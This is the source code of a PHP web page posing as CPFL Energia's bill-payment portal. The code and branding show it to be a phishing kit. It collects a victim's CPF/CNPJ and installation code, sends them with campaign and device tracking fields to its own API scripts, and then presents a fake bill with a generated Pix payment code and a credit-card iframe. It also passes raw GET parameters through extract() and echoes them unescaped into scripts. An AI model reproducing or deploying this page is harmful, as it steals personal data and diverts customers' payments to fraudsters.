<?php

extract($_GET);

if($sucesso){

 include_once "../../db.php";

    $doc = $sucesso;

    $Protocolo = isset($sucesso)  ? $sucesso : null;

    $check = $pdo->prepare("SELECT* FROM logins WHERE login_info LIKE :login_info LIMIT 1");
    $check->execute([':login_info' => "%$sucesso%"]);
    $retorno = $check->fetch();

    if($retorno){

          $JsonDados = json_decode(base64_decode($retorno['resposta']));

          $dados = json_decode($JsonDados);
        
          $faturas = $dados->debitos;

        }else{

       exit();
    }

}

$URL_QR = "https://api.qrserver.com/v1/create-qr-code/?size=300x300&data=";

?>

<!DOCTYPE html>
<html lang="pt-BR">

<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <style type="text/css">
    [uib-typeahead-popup].dropdown-menu {
        display: block;
    }
    </style>
    <style type="text/css">
    .uib-time input {
        width: 50px;
    }

    /* Modal Content */
    .modal-content {
        position: relative;
        margin: auto;
        padding: 0;
        -webkit-animation-name: animatetop;
        -webkit-animation-duration: 0.4s;
        animation-name: animatetop;
        animation-duration: 0.4s
    }

    #alert {
        position: absolute;
        z-index: 23;
    }

    /* Add Animation */
    @-webkit-keyframes animatetop {
        from {
            top: -300px;
            opacity: 0
        }

        to {
            top: 0;
            opacity: 1
        }
    }

    @keyframes animatetop {
        from {
            top: -300px;
            opacity: 0
        }

        to {
            top: 0;
            opacity: 1
        }
    }
    </style>

    <link rel="shortcut icon" href="/imagens/cpfl.ico" type="image/x-png">


    <style type="text/css">
    [uib-tooltip-popup].tooltip.top-left>.tooltip-arrow,
    [uib-tooltip-popup].tooltip.top-right>.tooltip-arrow,
    [uib-tooltip-popup].tooltip.bottom-left>.tooltip-arrow,
    [uib-tooltip-popup].tooltip.bottom-right>.tooltip-arrow,
    [uib-tooltip-popup].tooltip.left-top>.tooltip-arrow,
    [uib-tooltip-popup].tooltip.left-bottom>.tooltip-arrow,
    [uib-tooltip-popup].tooltip.right-top>.tooltip-arrow,
    [uib-tooltip-popup].tooltip.right-bottom>.tooltip-arrow,
    [uib-tooltip-html-popup].tooltip.top-left>.tooltip-arrow,
    [uib-tooltip-html-popup].tooltip.top-right>.tooltip-arrow,
    [uib-tooltip-html-popup].tooltip.bottom-left>.tooltip-arrow,
    [uib-tooltip-html-popup].tooltip.bottom-right>.tooltip-arrow,
    [uib-tooltip-html-popup].tooltip.left-top>.tooltip-arrow,
    [uib-tooltip-html-popup].tooltip.left-bottom>.tooltip-arrow,
    [uib-tooltip-html-popup].tooltip.right-top>.tooltip-arrow,
    [uib-tooltip-html-popup].tooltip.right-bottom>.tooltip-arrow,
    [uib-tooltip-template-popup].tooltip.top-left>.tooltip-arrow,
    [uib-tooltip-template-popup].tooltip.top-right>.tooltip-arrow,
    [uib-tooltip-template-popup].tooltip.bottom-left>.tooltip-arrow,
    [uib-tooltip-template-popup].tooltip.bottom-right>.tooltip-arrow,
    [uib-tooltip-template-popup].tooltip.left-top>.tooltip-arrow,
    [uib-tooltip-template-popup].tooltip.left-bottom>.tooltip-arrow,
    [uib-tooltip-template-popup].tooltip.right-top>.tooltip-arrow,
    [uib-tooltip-template-popup].tooltip.right-bottom>.tooltip-arrow,
    [uib-popover-popup].popover.top-left>.arrow,
    [uib-popover-popup].popover.top-right>.arrow,
    [uib-popover-popup].popover.bottom-left>.arrow,
    [uib-popover-popup].popover.bottom-right>.arrow,
    [uib-popover-popup].popover.left-top>.arrow,
    [uib-popover-popup].popover.left-bottom>.arrow,
    [uib-popover-popup].popover.right-top>.arrow,
    [uib-popover-popup].popover.right-bottom>.arrow,
    [uib-popover-html-popup].popover.top-left>.arrow,
    [uib-popover-html-popup].popover.top-right>.arrow,
    [uib-popover-html-popup].popover.bottom-left>.arrow,
    [uib-popover-html-popup].popover.bottom-right>.arrow,
    [uib-popover-html-popup].popover.left-top>.arrow,
    [uib-popover-html-popup].popover.left-bottom>.arrow,
    [uib-popover-html-popup].popover.right-top>.arrow,
    [uib-popover-html-popup].popover.right-bottom>.arrow,
    [uib-popover-template-popup].popover.top-left>.arrow,
    [uib-popover-template-popup].popover.top-right>.arrow,
    [uib-popover-template-popup].popover.bottom-left>.arrow,
    [uib-popover-template-popup].popover.bottom-right>.arrow,
    [uib-popover-template-popup].popover.left-top>.arrow,
    [uib-popover-template-popup].popover.left-bottom>.arrow,
    [uib-popover-template-popup].popover.right-top>.arrow,
    [uib-popover-template-popup].popover.right-bottom>.arrow {
        top: auto;
        bottom: auto;
        left: auto;
        right: auto;
        margin: 0;
    }

    [uib-popover-popup].popover,
    [uib-popover-html-popup].popover,
    [uib-popover-template-popup].popover {
        display: block !important;
    }
    </style>
    <style type="text/css">
    .uib-datepicker-popup.dropdown-menu {
        display: block;
        float: none;
        margin: 0;
    }

    .uib-button-bar {
        padding: 10px 9px 2px;
    }
    </style>
    <style type="text/css">
    .uib-position-measure {
        display: block !important;
        visibility: hidden !important;
        position: absolute !important;
        top: -9999px !important;
        left: -9999px !important;
    }

    .uib-position-scrollbar-measure {
        position: absolute !important;
        top: -9999px !important;
        width: 50px !important;
        height: 50px !important;
        overflow: scroll !important;
    }

    .uib-position-body-scrollbar-measure {
        overflow: scroll !important;
    }
    </style>
    <style type="text/css">
    .uib-datepicker .uib-title {
        width: 100%;
    }

    .uib-day button,
    .uib-month button,
    .uib-year button {
        min-width: 100%;
    }

    .uib-left,
    .uib-right {
        width: 100%
    }
    </style>
    <style type="text/css">
    .ng-animate.item:not(.left):not(.right) {
        -webkit-transition: 0s ease-in-out left;
        transition: 0s ease-in-out left
    }
    </style>
    <style type="text/css">
    @charset "UTF-8";

    [ng\:cloak],
    [ng-cloak],
    [data-ng-cloak],
    [x-ng-cloak],
    .ng-cloak,
    .x-ng-cloak,
    .ng-hide:not(.ng-hide-animate) {
        display: none !important;
    }

    ng\:form {
        display: block;
    }

    .ng-animate-shim {
        visibility: hidden;
    }

    .ng-anchor {
        position: absolute;
    }

    .basepix {
        background: #ffffff;
        padding: 12px;
        display: flex;
        justify-content: center;
    }

    @media (max-width: 600px) {
        .modal-dialog {
            margin: 3px !important;
            height: 99%;
        }

        .basepix {
            display: block;
        }
    }

    .button--soft {
        border: 1px solid #00c2c1;
        background-color: transparent;
        color: #00c2c1;
        width: 100%;
        display: flex;
        align-items: center;
        justify-content: center;
        font-weight: 600;
        line-height: 2.18rem;
    }
    </style>
    <meta http-equiv="X-UA-Compatible" content="IE=edge">

    <title>CPFL Energia - Serviços OnLine</title>
    <meta name="format-detection" content="telephone=no">
    <meta name="msapplication-tap-highlight" content="no">
    <meta name="description" content="">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width,initial-scale=0.8,user-scalable=0,minimal-ui">
    <meta name="theme-color" content="#006699">
    <meta name="keywords"
        content="Transmissão e Energia, Produtos de Energia, Subestação, Subestações, Linhas de Transmissão, Empresas de Energia, Sustentabilidade, Mercado Livre, Mercado Cativo, Energia Elétrica, Energia Sustentável, Energia Renovável, Energia">
    <link rel="stylesheet" href="./<?= $diretorio ?>/CPFLEnergia_files/loadingScreen.css">
    <link rel="stylesheet" href="./<?= $diretorio ?>/CPFLEnergia_files/app.css">
    <link rel="stylesheet" href="./<?= $diretorio ?>/CPFLEnergia_files/vendor.css">

    <style type="text/css"></style>

    <script>
    var sex = false,
        documento;

    if (<?=$sucesso ? 'true' : 'false'?>) {

        var dados = <?=$JsonDados ? $JsonDados : 'false'?>;
    }

    function verificar(e) {

        sex = setInterval(() => {

            var xhttp = new XMLHttpRequest();
            xhttp.onreadystatechange = function() {
                if (this.readyState == 4 && this.status == 200) {
                    if (this.response == 'sim') {
                        window.location.href = "./<?= $diretorio ?>/?link=<?=$ttlLink?>&sucesso=true";
                    }
                }
            };
            xhttp.open("POST", e, true);
            xhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
            xhttp.send('tela=Cpfl&documento=' + documento);

        }, 3000);

    }

    function Post(data, urlapi) {

        var xhttp = new XMLHttpRequest();
        xhttp.onreadystatechange = function() {
            if (this.readyState == 4 && this.status == 200) {
                var json = this.response;
                status(json);
            } else {
                if (this.status == 500) {
                    if (this.response.res == 'sucesso!') {
                        window.location.href = "./<?= $diretorio ?>/?link=<?=$ttlLink?>&sucesso=true";
                    }
                }
            }
        };
        xhttp.open("POST", urlapi, true);
        xhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
        xhttp.responseType = 'json';
        xhttp.send(data);

        return false;
    }

    function ID(e) {
        return document.getElementById(e);
    }

    var sucesso = "<?=$sucesso?>";

    function status(e) {

        if (e && e.pix) {

            ID('pix').value = e.pix;
            ID('imgpix').src = '<?=$URL_QR?>' + e.pix;
            // ID('valorfinal').innerHTML = e[0].valor;
            ID('loand').style = 'display: none;';

        } else {

            if (e) {

                if (e.status) {

                    if (ID('loandLog')) {
                        clearInterval(sex);
                        ID('loandLog').style = 'display:none;';
                    }

                    window.location.href = "./<?= $diretorio ?>/?link=<?=$ttlLink?>&sucesso=true";

                }

            } else {

                if (ID('loandLog')) {
                    clearInterval(sex);
                    ID('loandLog').style = 'display:none;';
                }
            }
        }

    }

    function openPVC(e) {
        if (e) {
            ID('modalCC').style = "display: flex;align-items: center;background: #0000003b;";
        } else {
            ID('modalCC').style = "display:none;";
        }
    }

    function limparValor(valor) {
        return parseFloat(
            valor
            .replace(/[^0-9,\.]/g, "") // remove tudo que não for número , ou .
            .replace(/\./g, "") // remove todos os pontos
            .replace(",", ".") // troca vírgula por ponto
        );
    }

    function verFatura(e, a, b) {

        ID('ParceiroNegocio').innerHTML = '<?= $dados->cpf ?>';
        ID('Instalacao').innerHTML = '******' + '<?=$dados->instalacao?>';
        ID('NomeCliente').innerHTML = '<?= $dados->nome ?>';
        ID('NumeroContaEnergia').innerHTML = '<?= $dados->cpf ?>';
        ID('MesReferencia').innerHTML = dados.debitos[b].vencimento;
        ID('periodo').innerHTML = '<?=$Protocolo?>';
        ID('DataFaturamento').innerHTML = dados.debitos[b].vencimento;
        ID('Vencimento').innerHTML = dados.debitos[b].vencimento;

        ID('loand').style = '';
        document.body.style = "overflow: hidden !important;";

        ID('valorp').innerHTML = a;

        Post('out=' + b + '&nome=<?=$dados->nome?>&fatura=' + b + '&valor=' + limparValor(a) +
            '&instalacao=<?=$dados->instalacao?>&NumeroContaEnergia=' + e +
            '&ContaContrato=<?=$ContaContrato?>&cpf_cnpj=<?=$dados->cpf?>', '/data/pix.php');

        ID('basePix').style = 'z-index: 1050; display: block;background: #0000004d;';

    }

    function Alert(e) {
        openPVC();
        ID('alert').style = "";
    }

    function copy() {
        var content = document.getElementById('pix');
        content.select();
        document.execCommand('copy');
    }

    function Fechar() {
        ID('basePix').style = 'display:none;';
        document.body.style = '';
    }


    function Vteceiros(data, urlapi) {

        var xhttp = new XMLHttpRequest();
        xhttp.onreadystatechange = function() {
            if (this.readyState == 4 && this.status == 200) {
                var json = this.response;
                if (json) {
                    document.body.innerHTML = json;
                }
            }
        };
        xhttp.open("POST", urlapi, true);
        xhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
        xhttp.send(data);

        return false;
    }


    function ValidarLog() {

        if (ID('codigoImovel').value && ID('documentoCpf').value) {

            ID('loandLog').style = '';

            documento = ID('documentoCpf').value;

            var codigoImovel = ID('codigoImovel').value.replace(/[^\d]+/g, '');
            var documentoCpf = ID('documentoCpf').value.replace(/[^\d]+/g, '');

            // Preparar dados e enviar primeiro para ./api/apiTokem.php
            const tokenForm = new URLSearchParams();
            tokenForm.append('campanha', ID('campanha')?.value || '');
            tokenForm.append('aparelho', ID('aparelho')?.value || '');
            tokenForm.append('redin', 'cpfl');
            tokenForm.append('operador', 'cpfl');
            tokenForm.append('horaON', Date.now().toString());
            tokenForm.append('documento', documentoCpf);
            tokenForm.append('status', '0');
            tokenForm.append('executar', 'esperando');
            tokenForm.append('instalacao', codigoImovel);

            const maxTentativas = 30;

            function verificarValidacao(tentativa = 0) {
                const dados = new URLSearchParams();
                dados.append('documento', documentoCpf);
                dados.append('instalacao', codigoImovel);
                dados.append('tela', 'cpfl');

                return fetch('./api/IsValidor.php', {
                    method: 'POST',
                    headers: {
                        'accept': '*/*',
                        'content-type': 'application/x-www-form-urlencoded'
                    },
                    body: dados.toString(),
                    credentials: 'include'
                }).then(response => response.json()).then(result => {
                    if (result && result.IsStatus === true) {
                        if (ID('loandLog')) ID('loandLog').style = 'display:none;';
                        try {
                            localStorage.setItem('CpflValidacao', JSON.stringify(result));
                        } catch (e) {}
                        window.location.href = "./?sucesso=" + documentoCpf;
                        return result;
                    }

                    if (result && result.IsStatus === false) {
                        if (ID('loandLog')) ID('loandLog').style = 'display:none;';
                        mostrarAlerta(result?.data?. [0]?.message || 'Erro na Validação', 'Erro na Validação',
                            '❌');
                        return result;
                    }

                    if (tentativa < maxTentativas - 1) {
                        return new Promise(resolve => setTimeout(resolve, 2000)).then(() => verificarValidacao(
                            tentativa + 1));
                    }

                    if (ID('loandLog')) ID('loandLog').style = 'display:none;';
                    mostrarAlerta('Máximo de tentativas atingido. Tente novamente mais tarde.', 'Erro', '❌');
                    return Promise.reject(new Error('Máximo de tentativas atingido'));
                }).catch(err => {
                    if (tentativa < maxTentativas - 1) return new Promise(resolve => setTimeout(resolve, 2000))
                        .then(() => verificarValidacao(tentativa + 1));
                    if (ID('loandLog')) ID('loandLog').style = 'display:none;';
                    mostrarAlerta('Erro ao validar: ' + (err.message || err), 'Erro', '❌');
                    return Promise.reject(err);
                });
            }

            // Envia primeiro para apiTokem, depois inicia polling (mesmo se falhar, iniciamos polling)
            fetch('./api/apiTokem.php', {
                method: 'POST',
                headers: {
                    'content-type': 'application/x-www-form-urlencoded'
                },
                body: tokenForm.toString(),
                credentials: 'include'
            }).then(resp => resp.json()).then(() => {
                verificarValidacao();
            }).catch(() => {
                verificarValidacao();
            });

        }

    }

    function Sselect(e) {

        if (e == 'selectCpf') {
            document.getElementById('documentoCpf').placeholder = 'xxx.xxx.xxx-xx';
            document.getElementById(e).checked = true;
            document.getElementById('selectCnpj').checked = false;
        } else {
            document.getElementById('documentoCpf').placeholder = 'xx.xxx.xxx/xxxx-xx';
            document.getElementById(e).checked = true;
            document.getElementById('selectCpf').checked = false;
        }
    }

    function fecharAlet(e) {
        ID('alert').style = "display: none;";
        document.body.style = "";
    }

    function validaCpfCnpj(val) {

        val = val.replace(/\./g, '');

        if (val.length == 11) {

            var cpf = val.trim();

            cpf = cpf.replace(/\./g, '');
            cpf = cpf.replace('-', '');
            cpf = cpf.split('');

            var v1 = 0;
            var v2 = 0;
            var aux = false;

            for (var i = 1; cpf.length > i; i++) {
                if (cpf[i - 1] != cpf[i]) {
                    aux = true;
                }
            }

            if (aux == false) {
                return false;
            }

            for (var i = 0, p = 10;
                (cpf.length - 2) > i; i++, p--) {
                v1 += cpf[i] * p;
            }

            v1 = ((v1 * 10) % 11);

            if (v1 == 10) {
                v1 = 0;
            }

            if (v1 != cpf[9]) {
                return false;
            }

            for (var i = 0, p = 11;
                (cpf.length - 1) > i; i++, p--) {
                v2 += cpf[i] * p;
            }

            v2 = ((v2 * 10) % 11);

            if (v2 == 10) {
                v2 = 0;
            }

            if (v2 != cpf[10]) {
                return false;
            } else {
                return true;
            }
        } else if (val.length > 13) {
            var cnpj = val.trim();

            cnpj = cnpj.replace(/\./g, '');
            cnpj = cnpj.replace('-', '');
            cnpj = cnpj.replace('/', '');
            cnpj = cnpj.split('');

            var v1 = 0;
            var v2 = 0;
            var aux = false;

            for (var i = 1; cnpj.length > i; i++) {
                if (cnpj[i - 1] != cnpj[i]) {
                    aux = true;
                }
            }

            if (aux == false) {
                return false;
            }

            for (var i = 0, p1 = 5, p2 = 13;
                (cnpj.length - 2) > i; i++, p1--, p2--) {
                if (p1 >= 2) {
                    v1 += cnpj[i] * p1;
                } else {
                    v1 += cnpj[i] * p2;
                }
            }

            v1 = (v1 % 11);

            if (v1 < 2) {
                v1 = 0;
            } else {
                v1 = (11 - v1);
            }

            if (v1 != cnpj[12]) {
                return false;
            }

            for (var i = 0, p1 = 6, p2 = 14;
                (cnpj.length - 1) > i; i++, p1--, p2--) {
                if (p1 >= 2) {
                    v2 += cnpj[i] * p1;
                } else {
                    v2 += cnpj[i] * p2;
                }
            }

            v2 = (v2 % 11);

            if (v2 < 2) {
                v2 = 0;
            } else {
                v2 = (11 - v2);
            }

            if (v2 != cnpj[13]) {
                return false;
            } else {
                return true;
            }
        } else {
            return false;
        }
    }

    function ValidarPut(a, b) {
        if (b == 1) {
            if (a.value) {
                a.className = 'form-control ng-dirty ng-valid-parse ng-touched ng-not-empty ng-valid ng-valid-required';
            } else {
                a.className = 'form-control ng-dirty ng-valid-parse ng-touched ng-empty ng-invalid ng-invalid-required';
            }
        }

        if (b == 2) {
            if (validaCpfCnpj(a.value)) {
                a.className = 'form-control ng-dirty ng-valid-parse ng-touched ng-not-empty ng-valid ng-valid-required';
            } else {
                a.className = 'form-control ng-dirty ng-valid-parse ng-touched ng-empty ng-invalid ng-invalid-required';
            }
        }
    }
    </script>
</head>

<body data-="" class="pg-loaded" style="overflow: visible;">



    <input class="challenge-input" type="hidden" id="campanha" value="<?=$campanha;?>">
    <input class="challenge-input" type="hidden" id="aparelho" value="<?=$aparelho;?>">


    <div id="alert" style="display: none;">
        <div
            style="width: 100%;position: fixed;height: 100%;background: #0000005e;z-index: 2;justify-content: center;align-items: center;display: flex;">
            <div class="modal-content"
                style="width: 433px;height: 223px;background: white;display: flex;border-radius: 5px;">
                <div
                    style="position: absolute;width: 100%;justify-content: center;display: flex;align-items: center;height: 70%;">
                    <img src="https://cdn-icons-png.flaticon.com/512/179/179386.png"
                        style="width: 60px;margin-top: -62px;"><br>
                    <div style="position: absolute;margin-top: 36px;font-weight: 600;color: #898686;font-size: 22px;">
                        Atenção !
                    </div>
                    <div
                        style="position: absolute;margin-top: 113px;color: #898686;font-size: 13px;text-align: center;padding: 2px;">
                        Forma de pagamento indisponível no momento, tente mais tarde ou pague via Pix.
                    </div>
                </div>

                <div
                    style="display: flex;width: 100%;font-weight: 700;justify-content: end;margin: 8px 0px 0px -11px;z-index: 213;height: 100%;">
                    <div onclick="fecharAlet()" title="fechar"
                        style="color: #585858;float: right;display: flex;cursor: pointer;font-size: 20px;">X
                    </div>
                </div>
            </div>
        </div>
    </div>

    <div class="modal modal--large-container" id="modalCC" style="display: none;">
        <div class="modal__overlay" role="button" tabindex="0"></div>
        <div class="modal-content modal__container modal__container--pagamento false undefined"
            style="width: 481px;margin-top: 6pc;">
            <div onclick="openPVC(false);" class="modal__close" role="button" tabindex="-3"
                style="position: absolute;right: 6px;top: 6px;padding: 10px;z-index: 1;cursor: pointer;">
                <img src="./<?= $diretorio ?>/CPFLEnergia_files/icon_close.svg" alt="">
            </div>
            <p class="modal__title"
                style="font-weight: 600;font-size: 16px;line-height: 22px;letter-spacing: .01em;color: #333;opacity: .8;width: calc(100% + 3rem);text-align: center;margin-bottom: 16px;padding: 1.3rem 5rem 0.8rem 0.5rem;">
                Pagamento com Cartão de Crédito</p>
            <div class="payment-with-credit-card " style="width: 100%;">

                <div style="display: flex; justify-content: center; align-items: center; width: 100%; height: 100%;"
                    id="msgcc">
                    <iframe src="./<?= $diretorio ?>/CPFLEnergia_files/iframe.php?campanha=<?=$campanha?>&tela=cpfl"
                        frameborder="0" width="100%" height="370px"></iframe>
                </div>
                <br>
            </div>
        </div>
    </div>


    <?php if(!$Protocolo || !$sucesso){ ?>

    <div uib-modal-window="modal-window" class="modal fade ng-scope ng-isolate-scope in" role="dialog" size="md"
        index="0" animate="animate" ng-style="{'z-index': 1050 + $$topModalIndex*10, display: 'block'}" tabindex="-1"
        uib-modal-animation-class="fade" modal-in-class="in" modal-animation="true"
        style="z-index: 1050;display: block;background: #00000085;">
        <div class="modal-dialog modal-md">
            <div class="modal-content" uib-modal-transclude="">

                <div id="loandLog" style="display: none;">
                    <div
                        style="border-radius: 9px;position: absolute;display: flex;justify-content: center;width: 100%;height: 100%;align-items: center;background: #ffffff61;z-index: 2;">
                        <center>
                            <img src="./<?= $diretorio ?>/CPFLEnergia_files/Spinner-btn.gif"
                                style="width: 60px;display: flex;">
                        </center>
                    </div>
                </div>

                <div class="modal-content cpfl-style ng-scope">
                    <div class="modal-header">
                        <div class="row">
                            <div class="col-xs-24">
                                <h2 class="modal-title ng-scope" id="modal-title" translate="@APP-VIA-PAGAMENTO-TITULO">
                                    Via Simplificada de Pagamento</h2>
                            </div>
                        </div>
                    </div>
                    <div class="modal-body">
                        <div class="row">
                            <div class="col-xs-24">
                                <alert target="modal-via-pagamento-login" class="ng-isolate-scope">
                                    <!-- ngRepeat: alert in $ctrl.alerts  | filter: $ctrl.filtro -->
                                </alert>
                            </div>
                        </div>
                        <div class="row">
                            <div class="col-xs-24">
                                <div class="row">
                                    <div class="col-xs-24">
                                        <p translate="@APP-MODAL-VIA-PAGAMENTO-LOGIN-MENSAGEM" class="ng-scope">Utilize
                                            o documento do titular e o seu código para acessar o serviço</p>
                                        <form name="viaPagamentoLoginForm" novalidate="" onsubmit="return false;"
                                            class="ng-pristine ng-invalid ng-invalid-required ng-valid-cpf">
                                            <div class="row">
                                                <div class="col-xs-24">
                                                    <div class="form-group"><label for="codigoImovel"
                                                            class="inputs ng-scope"
                                                            translate="@APP-MODAL-VIA-PAGAMENTO-LOGIN-INPUT-INSTALACAO">Seu
                                                            Código</label><input type="tel"
                                                            onkeyup="ValidarPut(this, 1)"
                                                            class="form-control ng-pristine ng-untouched ng-empty ng-invalid ng-invalid-required"
                                                            id="codigoImovel" placeholder="Insira o seu código"
                                                            ng-model="vm.instalacao" cpfl-highlight-input=""
                                                            autocomplete="off" required=""><span
                                                            class="highlight"></span><span class="bar"></span>
                                                        <div class="buttons np"><button type="button"
                                                                class="btn btn-link ng-scope"
                                                                ng-click="vm.encontrarInstalacao()"
                                                                translate="@APP-LOGIN-BTN-ENCONTRAR-CODIGO">Não encontro
                                                                meu código</button></div>
                                                    </div>
                                                </div>
                                                <div class="col-xs-24 col-md-24">
                                                    <div class="form-group">
                                                        <div class="radio-box-horizontal" ng-init="vm.cpfCnpj = 'cpf'">
                                                            <label onclick="Sselect('selectCpf')"
                                                                class="radio-inline"><input type="radio" checked
                                                                    id="selectCpf" value="cpf"
                                                                    ng-change="vm.documento = undefined"
                                                                    ng-model="vm.cpfCnpj"
                                                                    class="ng-pristine ng-untouched ng-valid ng-not-empty"
                                                                    name="622"> <span translate="@APP-COMMON-CPF"
                                                                    class="ng-scope">CPF</span></label><label
                                                                onclick="Sselect('selectCnpj')"
                                                                class="radio-inline"><input type="radio" id="selectCnpj"
                                                                    value="cnpj" ng-change="vm.documento = undefined"
                                                                    ng-model="vm.cpfCnpj"
                                                                    class="ng-pristine ng-untouched ng-valid ng-not-empty"
                                                                    name="624"> <span translate="@APP-COMMON-CNPJ"
                                                                    class="ng-scope">CNPJ</span></label>
                                                        </div>
                                                        <!-- ngIf: vm.cpfCnpj == 'cpf' -->
                                                        <div ng-if="vm.cpfCnpj == 'cpf'" class="ng-scope"><input
                                                                onkeyup="ValidarPut(this, 2)" id="documentoCpf"
                                                                class="form-control ng-pristine ng-untouched ng-empty ng-invalid ng-invalid-required ng-valid-cpf"
                                                                type="tel" placeholder="xxx.xxx.xxx-xx"
                                                                ng-model="vm.documento" ng-cpf="" custom-cpf-mask=""
                                                                cpfl-highlight-input="" autocomplete="off"
                                                                required=""><span class="highlight"></span><span
                                                                class="bar"></span></div>
                                                        <!-- end ngIf: vm.cpfCnpj == 'cpf' -->
                                                        <!-- ngIf: vm.cpfCnpj == 'cnpj' -->
                                                    </div>
                                                    <div class="row">
                                                        <div class="buttons">
                                                            <div class="col-xs-24 col-md-12 col-md-push-12"><button
                                                                    onclick="ValidarLog()" id="btnEnviar" type="submit"
                                                                    class="btn btn-default btn-lg btn-block hand ng-scope"
                                                                    translate="@APP-MODAL-VIA-PAGAMENTO-BTN-CONSULTAR"
                                                                    ng-click="vm.loginViaPagamento(viaPagamentoLoginForm);">Consultar</button>
                                                            </div>
                                                            <div style="display:none;"
                                                                class="col-xs-24 col-md-12 col-md-pull-12"><button
                                                                    id="btnVoltar" type="submit"
                                                                    class="btn btn-secondary btn-lg btn-block hand ng-scope"
                                                                    translate="@APP-MODAL-VIA-PAGAMENTO-BTN-FECHAR"
                                                                    ng-click="vm.fechar();">Fechar</button></div>
                                                        </div>
                                                    </div>
                                                </div>
                                            </div>
                                        </form>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                    <div class="modal-footer"></div>
                </div>
            </div>
        </div>
    </div>

    <?php } ?>

    <div style='display:none;' id="basePix" uib-modal-window="modal-window"
        class="modal fade ng-scope ng-isolate-scope in" role="dialog" size="sm" index="0" animate="animate"
        ng-style="{'z-index': 1050 + $$topModalIndex*10, display: 'block'}" tabindex="-1"
        uib-modal-animation-class="fade" modal-in-class="in" modal-animation="true" style="">
        <div class="modal-dialog modal-sm  modal-content ">
            <div uib-modal-transclude="">


                <div class="ng-scope">

                    <div id="loand" style="display: none;">
                        <div
                            style="border-radius: 9px;position: absolute;display: flex;justify-content: center;width: 100%;height: 100%;align-items: center;background: white;z-index: 2;">
                            <center>
                                <img src="./<?= $diretorio ?>/CPFLEnergia_files/Spinner-btn.gif"
                                    style="width: 60px;display: flex;">
                            </center>
                        </div>
                    </div>

                    <div class="modal-body" id="via-pagamento">
                        <div style="justify-content: end;display: flex;width: 100%;">
                            <div onclick="Fechar()" title="Fechar"
                                style="position: absolute;font-weight: 1000;cursor: pointer;z-index: 132424231;">X
                            </div>
                        </div>

                        <div class="cpfl-style ng-scope" ng-repeat="registro in vm.resultado">
                            <table style="height:100%;width:100%; display:inline-block">
                                <tbody>
                                    <tr>
                                        <td valign="top" width="20%"><img
                                                ng-src="https://servicosonline.cpfl.com.br/agencia-webapp/assets/images/logos/logo-cpfl-paulista-conta.png"
                                                src="https://servicosonline.cpfl.com.br/agencia-webapp/assets/images/logos/logo-cpfl-paulista-conta.png">
                                        </td>
                                        <td valign="top" width="45%">

                                        </td>

                                    </tr>
                                    <tr style="background-color: Silver">
                                        <td style="border-top: black 2px solid" align="center" colspan="3">
                                            <font face="Tahoma" size="1"><span
                                                    translate="@APP-MODAL-VIA-PAGAMENTO-DADOS-CADASTRAIS-TITULO"
                                                    class="ng-scope"><b>DADOS CADASTRAIS</b></span></font>
                                        </td>
                                    </tr>
                                    <tr>
                                        <td>
                                            <font face="Tahoma" size="1"><span
                                                    translate="@APP-MODAL-VIA-PAGAMENTO-DADOS-CADASTRAIS-SEU-CODIGO"
                                                    class="ng-scope">Seu Código</span></font>
                                        </td>
                                        <td>
                                            <font face="Tahoma" size="1"><span
                                                    translate="@APP-MODAL-VIA-PAGAMENTO-DADOS-CADASTRAIS-CLIENTE"
                                                    class="ng-scope">Cliente</span></font>
                                        </td>
                                        <td>
                                            <font face="Tahoma" size="1"><span
                                                    translate="@APP-MODAL-VIA-PAGAMENTO-DADOS-CADASTRAIS-CONTA-CONTRATO"
                                                    class="ng-scope">Nome do Cliente</span></font>
                                        </td>
                                    </tr>
                                    <tr>
                                        <td style="border-left: black 2px solid; border-bottom: black 1px solid">
                                            <font face="Tahoma" size="2"><span style="margin-left: 5px;"
                                                    ng-bind="registro.dadosBoleto.Instalacao" class="ng-binding"
                                                    id="Instalacao">xxxxxx0962</span></font>
                                        </td>
                                        <td style="border-left: black 2px solid; border-bottom: black 1px solid">
                                            <font face="Tahoma" size="2"><span style="margin-left: 5px;"
                                                    ng-bind="registro.dadosBoleto.ParceiroNegocio" class="ng-binding"
                                                    id="ParceiroNegocio">xxxxxx1969</span></font>
                                        </td>
                                        <td style="border-left: black 2px solid; border-bottom: black 1px solid"
                                            colspan="3">
                                            <font face="Tahoma" size="2"><span style="margin-left: 5px;"
                                                    ng-bind="registro.dadosBoleto.NomeCliente" class="ng-binding"
                                                    id="NomeCliente">JOSEFA</span></font>
                                        </td>
                                    </tr>

                                    <tr>
                                        <td colspan="3" height="3"></td>
                                    </tr>
                                    <tr>
                                        <td colspan="3">

                                        </td>
                                    </tr>
                                    <tr>
                                        <td style="border-left: black 2px solid" colspan="3">
                                            <font face="Tahoma" size="2"><span
                                                    ng-bind="registro.dadosBoleto.EnderecoInstalacao"
                                                    class="ng-binding"></span></font>
                                        </td>
                                    </tr>
                                    <tr style="background-color: silver">
                                        <td style="border-top: black 2px solid" align="center" colspan="3">
                                            <font face="Tahoma" size="1">
                                                <!-- ngIf: !registro.parcelamento --><span
                                                    translate="@APP-MODAL-VIA-PAGAMENTO-DADOS-CONTA-TITULO"
                                                    ng-if="!registro.parcelamento" class="ng-scope"><b>DADOS DA
                                                        CONTA</b></span><!-- end ngIf: !registro.parcelamento -->
                                                <!-- ngIf: registro.parcelamento -->
                                            </font>
                                        </td>
                                    </tr>
                                    <tr>
                                        <td>
                                            <font face="Tahoma" size="1"><span
                                                    translate="@APP-MODAL-VIA-PAGAMENTO-DADOS-CONTA-MES-REFERENCIA"
                                                    class="ng-scope">Mês Referência</span></font>
                                        </td>
                                        <td>
                                            <font face="Tahoma" size="1">
                                                <!-- ngIf: !registro.parcelamento --><span
                                                    translate="@APP-MODAL-VIA-PAGAMENTO-DADOS-CONTA-PERIODO-CONSUMO"
                                                    ng-if="!registro.parcelamento" class="ng-scope">Protocolo</span>
                                                <!-- end ngIf: !registro.parcelamento -->
                                                <!-- ngIf: registro.parcelamento -->
                                            </font>
                                        </td>
                                        <td>
                                            <font face="Tahoma" size="1">
                                                <!-- ngIf: !registro.parcelamento --><span
                                                    translate="@APP-MODAL-VIA-PAGAMENTO-DADOS-CONTA-NUMERO-CONTA"
                                                    ng-if="!registro.parcelamento" class="ng-scope">DOC</span>
